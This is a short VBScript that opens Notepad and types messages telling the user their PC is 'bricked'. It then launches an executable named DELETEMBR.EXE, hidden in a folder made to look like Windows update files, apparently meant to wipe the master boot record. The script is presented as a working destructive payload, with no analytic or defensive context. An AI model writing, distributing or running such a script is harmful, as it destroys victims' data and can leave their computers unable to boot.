set x=createobject("wscript.shell")
x.run "notepad.exe"
wscript.sleep 500  
x.sendkeys "Hello there"
wscript.sleep 500
x.sendkeys " Your PC Is Now Bricked"
wscript.sleep 500
x.sendkeys " Say GoodBye To Your PC"
wscript.sleep 500
x.sendkeys " GoodBye"
wscript.sleep 500
Dim objShell
Set objShell = WScript.CreateObject( "WScript.Shell" )
objShell.Run("""C:\Windows\SystemUpdateFiles\DELETEMBR.EXE""")
Set objShell = Nothing